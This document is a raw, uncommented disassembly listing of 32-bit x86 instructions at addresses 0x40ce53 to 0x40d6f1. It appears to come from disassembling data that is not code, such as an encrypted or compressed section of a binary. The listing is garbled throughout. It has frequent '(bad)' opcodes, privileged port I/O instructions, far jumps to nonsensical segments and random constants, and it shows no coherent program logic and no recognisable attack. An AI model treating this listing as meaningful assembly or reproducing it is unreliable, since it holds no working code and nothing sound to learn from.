  40ce53:	shl    BYTE PTR [ecx+ecx*2+0x6e8c4169],1
  40ce5a:	push   ds
  40ce5b:	rcl    esp,cl
  40ce5d:	in     al,dx
  40ce5e:	or     eax,ebp
  40ce60:	fstp   DWORD PTR [eax]
  40ce62:	(bad)  
  40ce65:	imul   esi,esp,0xffffff83
	...
  40ce7c:	sti    
  40ce7d:	sub    ecx,DWORD PTR [edx]
  40ce7f:	add    BYTE PTR ds:0x8182b1f1,dl
  40ce85:	outs   dx,DWORD PTR ds:[esi]
  40ce86:	or     DWORD PTR [edi],ecx
  40ce88:	adc    BYTE PTR [edx+0x2e8c0009],ch
  40ce8e:	pop    eax
  40ce8f:	or     al,0xf4
  40ce91:	ins    DWORD PTR es:[edi],dx
  40ce92:	and    al,BYTE PTR [eax]
  40ce94:	mov    esp,?
  40ce96:	in     al,dx
  40ce97:	or     ah,0x29
  40ce9a:	jne    0x40cee0
  40ce9c:	sbb    al,0x4f
  40ce9e:	pop    eax
  40ce9f:	or     al,0x1b
  40cea1:	jno    0x40ce3b
  40cea3:	(bad)  
  40cea4:	cmp    edi,ebp
  40cea6:	jno    0x40ceec
  40cea8:	int3   
  40cea9:	out    0x57,al
  40ceab:	enter  0x6903,0xc8
  40ceaf:	(bad)  
  40ceb0:	push   ecx
  40ceb1:	xlat   BYTE PTR ds:[ebx]
  40ceb2:	or     al,0x0
  40ceb4:	mov    WORD PTR [ebx],gs
  40ceb6:	(bad)  
  40ceb7:	cmp    al,0xe9
  40ceb9:	jb     0x40cf06
  40cebb:	add    BYTE PTR [edi+esi*1-0x2c2e72c6],cl
  40cec2:	cmp    al,0x6a
  40cec4:	lea    edx,[ecx-0x277395f4]
  40ceca:	inc    edi
  40cecb:	mov    al,0xdc
  40cecd:	xchg   esp,eax
  40cece:	fld    DWORD PTR [ebx]
  40ced0:	sbb    edi,ecx
  40ced2:	pop    ds
  40ced3:	xor    al,0x63
  40ced5:	lahf   
  40ced6:	mov    WORD PTR [edi],?
  40ced8:	int    0x94
  40ceda:	jmp    0x49:0x6282dfc3
	...
  40cef1:	add    BYTE PTR [eax],al
  40cef3:	add    BYTE PTR [eax],cl
  40cef5:	xchg   esp,eax
  40cef6:	mov    ebx,0xcfb70f17
  40cefb:	add    eax,eax
  40cefd:	mov    WORD PTR [edx+0x31],gs
  40cf00:	pushf  
  40cf01:	scas   al,BYTE PTR es:[edi]
  40cf02:	es push es
  40cf04:	imul   edx,DWORD PTR [esi+edx*1-0x6aca6baf],0xffffff8b
  40cf0c:	sbb    bh,BYTE PTR [edi-0x776734bd]
  40cf12:	xchg   edi,eax
  40cf13:	push   es
  40cf14:	mov    WORD PTR ds:0x381cdc36,fs
  40cf1a:	dec    edx
  40cf1c:	cli    
  40cf1d:	mov    esi,0xd7e1dc23
  40cf22:	fild   WORD PTR [ebx]
  40cf24:	jmp    0x40cee4
  40cf26:	mov    bh,0xdb
  40cf28:	loope  0x40ceec
  40cf2a:	fmulp  st(2),st
  40cf2c:	fidivr DWORD PTR [esi-0x3d262451]
  40cf32:	into   
  40cf33:	retf   0x4b69
  40cf36:	mov    ds:0x6adfc3f7,al
  40cf3b:	xlat   BYTE PTR ds:[ebx]
  40cf3c:	push   cs
  40cf3d:	push   eax
  40cf3e:	test   al,0x78
  40cf40:	dec    eax
  40cf41:	cmp    BYTE PTR [eax],dh
  40cf43:	pop    esp
  40cf44:	gs mov cl,0x20
  40cf47:	add    al,0x36
  40cf49:	(bad)
  40cf4d:	imul   eax,DWORD PTR [edx],0x45
  40cf50:	mov    WORD PTR [edx+eax*4],gs
  40cf53:	sub    BYTE PTR [esp+edx*4+0xc36c],cl
	...
  40cf6a:	add    BYTE PTR [eax],al
  40cf6c:	xchg   edx,eax
  40cf6d:	sbb    al,0x9
  40cf6f:	test   eax,0x6208948f
  40cf74:	mov    esp,0xe4fb8230
  40cf79:	fdiv   st,st(0)
  40cf7b:	mov    ecx,0x56f4a956
  40cf80:	mov    eax,ds:0x56298b90
  40cf85:	sbb    al,0x97
  40cf87:	jmp    0xbcca641b
  40cf8c:	push   edi
  40cf8d:	xor    al,0x7
  40cf8f:	ins    DWORD PTR es:[edi],dx
  40cf90:	stos   DWORD PTR es:[edi],eax
  40cf91:	xor    esi,esi
  40cf93:	jmp    0xea1da8e6
  40cf98:	(bad)  
  40cf99:	xchg   esp,eax
  40cf9a:	or     BYTE PTR [esi],ah
  40cf9c:	int3   
  40cf9d:	dec    esp
  40cf9e:	or     ecx,ebp
  40cfa0:	(bad)  
  40cfa1:	xchg   esp,eax
  40cfa2:	int    0xa4
  40cfa4:	fistp  QWORD PTR [ebx+0x8]
  40cfa7:	jmp    0x2d8d2b3b
  40cfac:	(bad)  
  40cfad:	xchg   esp,eax
  40cfae:	or     cl,ch
  40cfb0:	jp     0x40cf7a
  40cfb2:	lock (bad) 
  40cfb4:	stc    
  40cfb5:	and    BYTE PTR [ebp+esi*4-0x60],cl
  40cfb9:	and    DWORD PTR [ecx+edi*4-0x68],ecx
  40cfbd:	mov    esi,0x2c4bd607
  40cfc2:	idiv   BYTE PTR [ebx]
  40cfc4:	aam    0x9e
  40cfc6:	enter  0x7c3c,0x17
  40cfca:	je     0x40cf79
  40cfcc:	(bad)
	...
  40cfe4:	push   ebx
  40cfe5:	dec    eax
  40cfe6:	or     DWORD PTR ds:0xa4fbc4e,esi
  40cfec:	dec    edi
  40cfed:	xchg   esp,eax
  40cfee:	cmc    
  40cfef:	adc    al,0xdc
  40cff1:	cmp    esp,esi
  40cff3:	xor    al,0x90
  40cff5:	xchg   esp,eax
  40cff6:	add    DWORD PTR [ecx+0x6e9e3c],ebp
  40cffc:	cmp    bl,BYTE PTR [eax+0x73fc0008]
  40d002:	shr    bl,0x6a
  40d005:	push   esp
  40d006:	dec    ebp
  40d007:	enter  0x9765,0x8
  40d00b:	add    dl,dh
  40d00d:	jecxz  0x40cfcf
  40d00f:	(bad)  
  40d010:	cmp    BYTE PTR [ebx],al
  40d012:	div    DWORD PTR [ebp+0x6d]
  40d015:	dec    edi
  40d016:	in     al,dx
  40d017:	std    
  40d018:	ret    0xf75d
  40d01b:	jne    0x40cfc6
  40d01d:	push   eax
  40d01e:	xor    BYTE PTR [ebp+0x35],bl
  40d021:	xchg   edi,eax
  40d022:	mov    DWORD PTR [ebp-0x63],edi
  40d025:	cwde   
  40d026:	jl     0x40d030
  40d028:	(bad)  
  40d02a:	shr    al,1
  40d02c:	inc    ecx
  40d02d:	jp     0x40d037
  40d02f:	add    BYTE PTR [esi-0x54],bh
  40d032:	adc    BYTE PTR [ebp+0x7d],0xb1
  40d036:	pop    ss
  40d037:	(bad)  
  40d038:	clc    
  40d039:	pop    esi
  40d03a:	not    DWORD PTR [edx-0x3]
  40d03d:	scas   eax,DWORD PTR es:[edi]
  40d03e:	pop    esp
  40d03f:	cld    
  40d040:	jle    0x40d06c
  40d042:	div    DWORD PTR [ebp+0x1]
  40d045:	pop    esp
  40d046:	pop    eax
  40d047:	or     BYTE PTR [eax],al
	...
  40d059:	add    BYTE PTR [eax],al
  40d05b:	add    BYTE PTR [edx+ebx*2-0x4e57fff6],ch
  40d062:	loope  0x40cfe7
  40d064:	sub    DWORD PTR [edi],esi
  40d066:	pop    esp
  40d067:	add    DWORD PTR [eax-0x1abe9545],0xffffff96
  40d06e:	jnp    0x40d08e
  40d070:	cli    
  40d071:	xor    DWORD PTR [ebp+0x7987463],edx
  40d077:	add    BYTE PTR [ebp+0x46a1b696],ah
  40d07d:	xlat   BYTE PTR ds:[ebx]
  40d07e:	or     bl,ch
  40d080:	mov    edx,0xb726c7b4
  40d085:	pop    ss
  40d086:	int3   
  40d087:	add    cl,BYTE PTR [ebx+eiz*4-0x7773c275]
  40d08e:	fild   DWORD PTR [edx+0x413394c9]
  40d094:	mov    WORD PTR [ebx],?
  40d096:	icebp  
  40d097:	xor    DWORD PTR [edi+0x3c],0xa
  40d09b:	add    BYTE PTR [edi],cl
  40d09d:	add    DWORD PTR [edi+0x4b],eax
  40d0a0:	int    0x3b
  40d0a2:	or     cl,BYTE PTR [edi]
  40d0a4:	or     dl,ah
  40d0a6:	or     DWORD PTR [eax],eax
  40d0a8:	mov    WORD PTR [esi-0x33852f2],?
  40d0ae:	or     DWORD PTR [eax],eax
  40d0b0:	fwait
  40d0b1:	mov    edi,0x3c43ffea
  40d0b6:	leave  
  40d0b7:	inc    esp
  40d0b8:	cmp    BYTE PTR [edx+ecx*1],bh
  40d0bb:	add    BYTE PTR [edx+edi*2+0xf836],cl
	...
  40d0d2:	add    BYTE PTR [eax],al
  40d0d4:	mov    WORD PTR [ebx],?
  40d0d6:	or     al,BYTE PTR [eax]
  40d0d8:	adc    ecx,edi
  40d0da:	int    0x4f
  40d0dc:	or     DWORD PTR [ecx],eax
  40d0de:	ret    0xa64f
  40d0e1:	cmp    edx,DWORD PTR [edx-0x15]
  40d0e4:	outs   dx,DWORD PTR ds:[esi]
  40d0e5:	cld    
  40d0e6:	or     edi,edi
  40d0e8:	cdq    
  40d0e9:	test   al,0x34
  40d0eb:	inc    ecx
  40d0ec:	mov    WORD PTR [esi],?
  40d0ee:	retf   0x80e
  40d0f1:	push   0x9
  40d0f3:	add    BYTE PTR [esi+edi*4+0x428cf83f],cl
  40d0fa:	jbe    0x40d0a7
  40d0fc:	mov    WORD PTR [ebx],?
  40d0fe:	or     al,BYTE PTR [ebx+0xf0d5f51]
  40d104:	adc    BYTE PTR [esi],bl
  40d106:	or     eax,0x57a68c00
  40d10b:	cld    
  40d10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d10d:	mov    ebp,0x898c000c
  40d112:	jno    0x40d149
  40d114:	stos   DWORD PTR es:[edi],eax
  40d115:	xchg   esp,eax
  40d116:	adc    eax,0x8fd812ec
  40d11b:	(bad)  
  40d11c:	and    DWORD PTR [eax-0x4367be92],edx
  40d122:	inc    eax
  40d123:	arpl   bp,cx
  40d125:	xchg   esp,eax
  40d126:	xchg   edi,eax
  40d127:	in     eax,dx
  40d128:	out    0x94,eax
  40d12a:	fbstp  TBYTE PTR [ebx+ebx*2+0x502a015]
  40d131:	xlat   BYTE PTR ds:[ebx]
  40d132:	jg     0x40d190
  40d134:	sub    eax,0x3a0b5
	...
  40d149:	add    BYTE PTR [eax],al
  40d14b:	add    BYTE PTR [ebx],dl
  40d14d:	xlat   BYTE PTR ds:[ebx]
  40d14e:	dec    ebx
  40d14f:	mov    edi,0x3e040d0
  40d154:	mov    WORD PTR [esp+edx*2-0x263bcbbf],ss
  40d15b:	add    al,0xb6
  40d15d:	xchg   esp,eax
  40d15e:	fld    DWORD PTR [ebx]
  40d160:	or     edi,edx
  40d162:	aas    
  40d163:	xor    al,0xa6
  40d165:	xchg   esp,eax
  40d166:	push   esp
  40d167:	inc    ecx
  40d168:	sbb    al,0xc4
  40d16a:	cs icebp 
  40d16c:	lock fsub QWORD PTR [eax-0x6bab78fd]
  40d173:	sbb    BYTE PTR [edi],cl
  40d175:	scas   eax,DWORD PTR es:[edi]
  40d176:	repz add eax,DWORD PTR [eax-0x73fab887]
  40d17d:	xchg   esp,eax
  40d17e:	(bad)  
  40d180:	cmp    ebp,DWORD PTR [eax-0x6387392b]
  40d186:	out    0x50,al
  40d188:	hlt    
  40d189:	xor    BYTE PTR [ebp-0x28],dl
  40d18c:	loop   0x40d137
  40d18e:	neg    DWORD PTR [ebx-0x70]
  40d191:	xchg   esp,eax
  40d192:	into   
  40d193:	test   ebx,ebp
  40d195:	out    0xd9,al
  40d197:	(bad)  
  40d198:	retf   0x3530
  40d19b:	fsubr  DWORD PTR [ebx-0x73fbd5b6]
  40d1a1:	ror    BYTE PTR [eax],cl
  40d1a3:	mov    dh,0x74
  40d1a5:	sub    al,0x8a
  40d1a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1a8:	stos   DWORD PTR es:[edi],eax
  40d1a9:	adc    eax,0xa88fa174
  40d1ae:	jmp    FWORD PTR [ecx+0x0]
	...
  40d1c1:	add    BYTE PTR [eax],al
  40d1c3:	add    BYTE PTR [ecx+0x3a6c0594],dl
  40d1c9:	xor    esi,esi
  40d1cb:	mov    ss,WORD PTR [edx-0x57]
  40d1ce:	hlt    
  40d1cf:	xchg   BYTE PTR [ebp+ebp*4+0x41],bh
  40d1d3:	sub    BYTE PTR [eax+0x73abbfce],dl
  40d1d9:	xor    BYTE PTR [ebp+0x62],bl
  40d1dc:	inc    ebx
  40d1dd:	adc    ecx,ebp
  40d1df:	popa   
  40d1e0:	lds    edx,FWORD PTR [edx+eiz*2+0xa9530e]
  40d1e7:	inc    ecx
  40d1e8:	ds mov esp,0xd8c84ef5
  40d1ee:	hlt    
  40d1ef:	push   0xffffff94
  40d1f1:	pop    ecx
  40d1f2:	inc    edx
  40d1f3:	test   al,0x8f
  40d1f5:	xchg   esp,eax
  40d1f6:	jl     0x40d1ee
  40d1f8:	repnz fdiv st,st(0)
  40d1fb:	jmp    0xd249668f
  40d200:	dec    edi
  40d201:	loopne 0x40d25b
  40d203:	mov    ecx,0xbbf0c894
  40d208:	dec    edx
  40d209:	mov    ebx,ecx
  40d20b:	mov    ds:0x298b9450,al
  40d210:	push   eax
  40d211:	xchg   edx,eax
  40d212:	loope  0x40d1de
  40d214:	push   cs
  40d215:	mov    cl,0xf0
  40d217:	jmp    0xd3226478
  40d21c:	inc    edi
  40d21d:	add    eax,0x2f8829aa
  40d222:	jl     0x40d205
  40d224:	shr    DWORD PTR [eax+0xc100],1
	...
  40d23a:	add    BYTE PTR [eax],al
  40d23c:	cmp    eax,0x45cef62d
  40d241:	enter  0xf0,0x3e
  40d245:	and    dh,bh
  40d247:	jne    0x40d216
  40d249:	pop    ecx
  40d24a:	pop    eax
  40d24b:	or     dl,bh
  40d24d:	fild   WORD PTR [eax]
  40d24f:	call   0x3829b6
  40d254:	jmp    0xf756:0x4de800df
  40d25b:	(bad)  
  40d25c:	cli    
  40d25d:	fcomip st,st(4)
  40d25f:	jmp    DWORD PTR [eax-0x662c11d0]
  40d265:	pop    ecx
  40d266:	test   ecx,0x55089427
  40d26c:	out    dx,al
  40d26d:	dec    esp
  40d26e:	mov    eax,esp
  40d270:	in     eax,0x7e
  40d272:	pop    ebp
  40d273:	push   ebx
  40d274:	fidivr WORD PTR [edi+0x4]
  40d277:	(bad)  
  40d278:	addr16 xchg ebx,eax
  40d27a:	or     BYTE PTR [eax],al
  40d27c:	gs pop eax
  40d27e:	jge    0x40d288
  40d280:	int    0x27
  40d282:	push   eax
  40d283:	add    BYTE PTR ds:0x201fe14,dh
  40d289:	sub    ah,BYTE PTR [ebx]
  40d28b:	rcr    BYTE PTR [esi],0x78
  40d28e:	push   esi
  40d28f:	leave  
  40d290:	ja     0x40d2c2
  40d292:	not    al
  40d294:	jge    0x40d243
  40d296:	pop    esp
  40d297:	or     al,0x9c
  40d299:	xchg   edx,eax
  40d29a:	sbb    eax,0xd0152a
	...
  40d2b4:	cmc    
  40d2b5:	xchg   edx,eax
  40d2b6:	xor    DWORD PTR [ebp-0x3],0x9e0874ab
  40d2bd:	jp     0x40d32d
  40d2bf:	mov    esp,ebx
  40d2c1:	adc    dh,dl
  40d2c3:	xor    BYTE PTR [edi+0x2d],ah
  40d2c6:	jbe    0x40d2c4
  40d2c8:	lods   al,BYTE PTR ds:[esi]
  40d2c9:	loope  0x40d2d6
  40d2cb:	or     cl,0x82
  40d2ce:	loope  0x40d2eb
  40d2d0:	mov    WORD PTR [ebp+0x503e40cd],?
  40d2d6:	mov    bh,bl
  40d2d8:	dec    edx
  40d2d9:	outs   dx,BYTE PTR ds:[esi]
  40d2da:	hlt    
  40d2db:	jg     0x40d285
  40d2dd:	jnp    0x40d26b
  40d2df:	ret    
  40d2e0:	xchg   BYTE PTR [edx-0xd],dl
  40d2e3:	sub    cl,ah
  40d2e5:	sub    DWORD PTR [ebx],0xf1fad55e
  40d2eb:	call   DWORD PTR [edi+0x4d]
  40d2ee:	pop    eax
  40d2ef:	or     BYTE PTR [eax+0x44],dl
  40d2f2:	inc    ebp
  40d2f3:	add    al,0xb8
  40d2f5:	dec    ebx
  40d2f6:	rcl    DWORD PTR [esi],1
  40d2f8:	sar    BYTE PTR [edx+ebx*2+0xa],0xb8
  40d2fd:	jne    0x40d342
  40d2ff:	push   es
  40d300:	mov    al,ds:0x770a087c
  40d305:	xor    eax,0x56c7c011
  40d30a:	sub    al,0xc9
  40d30c:	dec    esi
  40d30d:	and    al,0xa
  40d30f:	shr    BYTE PTR [eax+eax*2-0x10],0xc3
  40d314:	div    dl
  40d316:	mov    ch,al
	...
  40d32c:	mov    fs,WORD PTR [edx]
  40d32e:	mov    eax,ds:0x36a2ee74
  40d333:	or     al,0x33
  40d335:	sub    al,0x7d
  40d337:	inc    esp
  40d338:	and    al,0x7f
  40d33a:	inc    esi
  40d33b:	or     BYTE PTR [ebx],dl
  40d33d:	add    esi,ecx
  40d33f:	(bad)  
  40d340:	rol    DWORD PTR [edi+0x3b8c0009],1
  40d346:	mov    DWORD PTR [ecx+edi*1],edi
  40d349:	repz dec edx
  40d34b:	add    BYTE PTR [edi+ebp*4+0x2b518d23],cl
  40d352:	cmp    ebp,DWORD PTR [edx-0x73]
  40d355:	adc    DWORD PTR [edx],ecx
  40d357:	push   0xffffff8c
  40d359:	adc    DWORD PTR [edx],ecx
  40d35b:	push   0xffffff8c
  40d35d:	xchg   esp,eax
  40d35e:	jl     0x40d3a9
  40d360:	aam    0xc4
  40d362:	(bad)  
  40d363:	sbb    DWORD PTR [ecx],esp
  40d365:	fisub  DWORD PTR [eax]
  40d367:	add    al,0x97
  40d369:	push   esp
  40d36a:	pop    esp
  40d36b:	dec    BYTE PTR [esi]
  40d36d:	mov    al,0xb3
  40d36f:	add    al,0x40
  40d371:	push   0x1980497a
  40d376:	sub    eax,0x3e9c66b4
  40d37b:	out    dx,al
  40d37c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d37d:	sbb    DWORD PTR ds:0xf7b006b8,edx
  40d383:	mov    es,WORD PTR [eax+0x24]
  40d386:	add    DWORD PTR [esi],0x7f
  40d389:	clc    
  40d38a:	push   0x49
  40d38c:	nop
  40d38d:	sub    eax,0xb3f5
	...
  40d3a2:	add    BYTE PTR [eax],al
  40d3a4:	or     dl,BYTE PTR [esi+esi*2-0x4bc387c7]
  40d3ab:	pop    esp
  40d3ac:	mov    WORD PTR [edi+esi*1-0x206b73fb],ss
  40d3b3:	pop    esi
  40d3b4:	mov    ebx,0x8bc638ce
  40d3b9:	xchg   esp,eax
  40d3ba:	or     al,ah
  40d3bc:	out    0xcd,al
  40d3be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3bf:	int3   
  40d3c0:	dec    ebp
  40d3c1:	pushf  
  40d3c2:	fistp  WORD PTR [eax+0x7]
  40d3c5:	inc    eax
  40d3c6:	arpl   ax,cx
  40d3c8:	repz mov ebx,0x2d2be3df
  40d3ce:	dec    eax
  40d3cf:	add    dh,BYTE PTR [edx-0x2f72d0d3]
  40d3d5:	xor    BYTE PTR [eax-0x206b93fd],bl
  40d3db:	stos   DWORD PTR es:[edi],eax
  40d3dc:	mov    esp,0x14c306be
  40d3e1:	xlat   BYTE PTR ds:[ebx]
  40d3e2:	pop    es
  40d3e3:	sub    al,0x8c
  40d3e5:	je     0x40d3c6
  40d3e7:	add    esp,esp
  40d3e9:	ja     0x40d3f3
  40d3eb:	xchg   esi,ecx
  40d3ed:	sub    eax,0xb51ba480
  40d3f2:	or     BYTE PTR [ecx],cl
  40d3f4:	nop
  40d3f5:	xchg   esp,eax
  40d3f6:	loopne 0x40d3ee
  40d3f8:	popf   
  40d3f9:	sub    eax,0x245460f6
  40d3fe:	popa   
  40d3ff:	jmp    0xd23700b3
  40d404:	mov    DWORD PTR [esi+0xbef5],edi
	...
  40d41a:	add    BYTE PTR [eax],al
  40d41c:	add    al,bl
  40d41e:	in     al,0x41
  40d420:	nop
  40d421:	je     0x40d42b
  40d423:	jmp    0xa6a5041f
  40d428:	into   
  40d429:	sbb    ecx,DWORD PTR [ecx+edx*4+0x67]
  40d42d:	xchg   esp,eax
  40d42e:	sub    cl,ch
  40d430:	(bad)  
  40d431:	cmp    al,0xf9
  40d433:	cld    
  40d434:	dec    esi
  40d435:	sub    eax,DWORD PTR [eax+0x7c2b242c]
  40d43b:	fldenv [edi-0x6fd79384]
  40d441:	sub    edi,DWORD PTR [ebp+ebp*2+0x37]
  40d445:	dec    esp
  40d446:	push   eax
  40d447:	jmp    0xee0debdb
  40d44c:	dec    esi
  40d44d:	mov    eax,ds:0xb84ac118
  40d452:	inc    edi
  40d453:	jmp    0x523175a6
  40d458:	pop    esp
  40d459:	int    0x8
  40d45b:	jmp    0x36462c6a
  40d460:	test   BYTE PTR fs:[eax-0x67],ah
  40d464:	imul   edx,ebp,0x8
  40d467:	es push esp
  40d469:	and    cl,ah
  40d46b:	arpl   WORD PTR [eax-0x2c95f76c],si
  40d471:	lahf   
  40d472:	cmc    
  40d473:	xchg   esp,eax
  40d474:	lahf   
  40d475:	mov    esp,0xd1090065
  40d47a:	or     bh,bh
  40d47c:	js     0x40d465
  40d47e:	in     eax,dx
  40d47f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  40d494:	cld    
  40d495:	xchg   edi,eax
  40d496:	or     BYTE PTR [ebx+0x75f59ba9],al
  40d49c:	aad    0x7f
  40d49e:	mov    ah,BYTE PTR [esp+eiz*4-0x70]
  40d4a2:	cmc    
  40d4a3:	jne    0x40d476
  40d4a5:	clc    
  40d4a6:	cdq    
  40d4a7:	pop    ecx
  40d4a8:	mov    ch,0x97
  40d4aa:	mov    esp,eax
  40d4ac:	rcl    DWORD PTR [ebp+edi*2+0xc],0x5d
  40d4b1:	or     BYTE PTR [edx+0x41],ch
  40d4b4:	mov    ch,0x54
  40d4b6:	jge    0x40d4a0
  40d4b8:	int    0x17
  40d4ba:	push   ecx
  40d4bb:	add    BYTE PTR [ebp-0xdf335f0],ah
  40d4c1:	arpl   WORD PTR [eax],bx
  40d4c3:	push   0x477cd9
  40d4c8:	adc    ah,BYTE PTR [ebx-0x14]
  40d4cb:	call   0x49a473
  40d4d0:	out    0x5c,al
  40d4d2:	add    ch,BYTE PTR [edx+0x75]
  40d4d5:	push   esp
  40d4d6:	jge    0x40d4d4
  40d4d8:	repnz arpl WORD PTR [edi+edi*8],ax
  40d4dc:	js     0x40d51f
  40d4de:	dec    esi
  40d4df:	inc    ecx
  40d4e0:	call   FWORD PTR gs:[ebx+0x70]
  40d4e4:	loop   0x40d53b
  40d4e6:	add    DWORD PTR [ebp-0x2b],0xf8ff087a
  40d4ed:	out    dx,al
  40d4ee:	div    BYTE PTR [ebp+0x21]
  40d4f1:	push   esp
  40d4f2:	cmp    eax,0x8d5edd3
  40d4f7:	call   0x40d4fc
	...
  40d50c:	cmc    
  40d50d:	data16 cmc 
  40d50f:	call   FWORD PTR [ebx+edx*8+0x54256ad4]
  40d516:	jge    0x40d50c
  40d518:	mov    WORD PTR [edx+0x40030c3d],es
  40d51e:	fld    QWORD PTR [edi+0x4d]
  40d521:	cmp    eax,0x2a7c29a2
  40d526:	leave  
  40d527:	mov    BYTE PTR [ecx-0x7b],dl
  40d52a:	es add bl,ah
  40d52d:	lahf   
  40d52e:	mov    ecx,0xc94561fe
  40d533:	xor    al,0xbf
  40d535:	fs dec ecx
  40d537:	add    BYTE PTR [eax+ebp*1-0x4c3c00c6],dh
  40d53e:	dec    esi
  40d53f:	aam    0x26
  40d541:	cmp    eax,0xe9a074c9
  40d546:	ds call 0x481dfcf7
  40d54c:	dec    ebp
  40d54d:	cmp    eax,0xf22bfda2
  40d552:	enter  0x4988,0xed
  40d556:	xchg   BYTE PTR [esp+ecx*2+0x6c],al
  40d55a:	(bad)  
  40d55b:	je     0x40d5c5
  40d55d:	sbb    edi,DWORD PTR [edi]
  40d55f:	or     al,0x7b
  40d561:	jmp    0x3c0e1d42
  40d566:	mov    ds:0xc8a2fbe5,al
  40d56b:	mov    cl,cl
  40d56d:	pop    es
  40d56e:	lea    edi,[eax+eax*1+0x0]
	...
  40d582:	add    BYTE PTR [eax],al
  40d584:	ins    BYTE PTR es:[edi],dx
  40d585:	cmp    al,0x19
  40d587:	test   BYTE PTR [ebx],bl
  40d589:	cmp    al,0xa
  40d58b:	add    BYTE PTR [edi],cl
  40d58d:	inc    ecx
  40d58e:	fdivp  st(7),st
  40d590:	xchg   edx,eax
  40d591:	scas   eax,DWORD PTR es:[edi]
  40d592:	data16 (bad) 
  40d594:	cmp    edi,DWORD PTR [ecx*4+0x193c5c7c]
  40d59b:	test   bh,ch
  40d59d:	cmp    ecx,DWORD PTR [edx]
  40d59f:	add    BYTE PTR [ecx],dl
  40d5a1:	icebp  
  40d5a2:	int    0x4f
  40d5a4:	sbb    edx,DWORD PTR [ebp-0x3ad4286c]
  40d5aa:	adc    al,0xc0
  40d5ac:	or     bl,BYTE PTR [esi+0x1a08101f]
  40d5b2:	loopne 0x40d5b7
  40d5b4:	mov    WORD PTR ds:0x9af3c78d,ss
  40d5ba:	imul   eax,DWORD PTR [esi-0x711fd615],0x48
  40d5c1:	pop    esp
  40d5c2:	nop
  40d5c3:	shl    BYTE PTR [eax+0x44],0xd8
  40d5c7:	repnz shr BYTE PTR [ecx],1
  40d5ca:	xlat   BYTE PTR ds:[ebx]
  40d5cb:	or     ecx,esp
  40d5cd:	mov    al,ds:0x5c408354
  40d5d2:	loopne 0x40d60b
  40d5d4:	sub    edi,DWORD PTR [edi+ecx*8-0x49155cfd]
  40d5db:	cmp    DWORD PTR [esp+edi*1+0x29a32cdd],edx
  40d5e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5e3:	cmp    DWORD PTR [ecx+ebp*1+0xc15],ebp
	...
  40d5fa:	add    BYTE PTR [eax],al
  40d5fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5fd:	mov    al,ds:0x298abf18
  40d602:	adc    eax,0xe79f82e0
  40d607:	stos   DWORD PTR es:[edi],eax
  40d608:	in     al,0xbb
  40d60a:	mov    ?,WORD PTR [edi-0x4058608e]
  40d610:	loopne 0x40d5ae
  40d612:	xchg   DWORD PTR [esi-0xb],ebx
  40d615:	sub    DWORD PTR [edi-0x41],esp
  40d618:	loopne 0x40d66a
  40d61a:	outs   dx,DWORD PTR ds:[esi]
  40d61b:	cmp    DWORD PTR [eax],edi
  40d61d:	sub    ebp,ebx
  40d61f:	or     esi,DWORD PTR [eax+esi*2]
  40d622:	enter  0x42be,0x29
  40d626:	(bad)  
  40d628:	cmp    bl,BYTE PTR [edi-0x634740f1]
  40d62e:	push   edi
  40d62f:	push   ss
  40d630:	mov    ch,0x29
  40d632:	or     DWORD PTR [esi],esi
  40d634:	push   gs
  40d636:	(bad)  
  40d637:	jmp    0xa4ca559f
  40d63c:	dec    edi
  40d63d:	xchg   ebp,eax
  40d63e:	jnp    0x40d62e
  40d640:	push   ss
  40d641:	rol    ah,1
  40d643:	push   ss
  40d644:	clc    
  40d645:	sub    DWORD PTR [ecx+eiz*8+0x27],edi
  40d649:	push   edx
  40d64a:	popa   
  40d64b:	push   es
  40d64c:	xor    edi,DWORD PTR [esi]
  40d64e:	add    edx,DWORD PTR [ebx-0x1e83d671]
  40d654:	aaa    
  40d655:	out    dx,al
  40d656:	pusha  
  40d657:	out    dx,al
  40d658:	sbb    ch,BYTE PTR [edx]
  40d65a:	jl     0x40d641
  40d65c:	daa    
  40d65d:	xchg   ebx,eax
  40d65e:	fiadd  WORD PTR fs:[eax]
	...
  40d671:	add    BYTE PTR [eax],al
  40d673:	add    BYTE PTR [edx],cl
  40d675:	sub    bh,BYTE PTR [ecx+edx*8-0x9]
  40d679:	sub    ah,BYTE PTR [edx-0x32]
  40d67c:	cli    
  40d67d:	sub    DWORD PTR [ebp+edi*4-0x19],edi
  40d681:	and    ah,BYTE PTR [edx-0x42]
  40d684:	jmp    0x623a:0xf7b97c29
  40d68b:	scas   al,BYTE PTR es:[edi]
  40d68c:	fisubr DWORD PTR [ecx]
  40d68e:	jl     0x40d625
  40d690:	out    0x32,eax
  40d692:	bound  ebx,QWORD PTR [esi-0x7e83d8b6]
  40d698:	aaa    
  40d699:	dec    esi
  40d69a:	bound  ecx,QWORD PTR [esi-0x7283d8c6]
  40d6a0:	daa    
  40d6a1:	inc    esi
  40d6a2:	bound  edi,QWORD PTR [esi+0x2a]
  40d6a5:	daa    
  40d6a6:	jl     0x40d631
  40d6a8:	aaa    
  40d6a9:	pop    esi
  40d6aa:	bound  ebp,QWORD PTR [esi+0x1a]
  40d6ad:	daa    
  40d6ae:	jl     0x40d6f5
  40d6b0:	daa    
  40d6b1:	push   esi
  40d6b2:	bound  ebx,QWORD PTR [esi+0xa]
  40d6b5:	daa    
  40d6b6:	jl     0x40d6e9
  40d6b8:	imul   ebp
  40d6ba:	popa   
  40d6bb:	dec    esi
  40d6bc:	cli    
  40d6bd:	es jl  0x40d6c0
  40d6c0:	xchg   ecx,eax
  40d6c1:	sti    
  40d6c2:	mov    bh,0x6b
  40d6c4:	push   0xffffffe6
  40d6c6:	div    BYTE PTR [ebp-0x7b]
  40d6c9:	sti    
  40d6ca:	lahf   
  40d6cb:	imul   ebp,DWORD PTR [edx-0x1a],0xfffffff6
  40d6cf:	jne    0x40d72a
  40d6d1:	sti    
  40d6d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6d3:	imul   ebp,DWORD PTR [edx+0xc2c0e6],0x0
	...
  40d6ea:	add    BYTE PTR [eax],al
  40d6ec:	jmp    0xf9cc3284
  40d6f1:	adc    ecx,edx
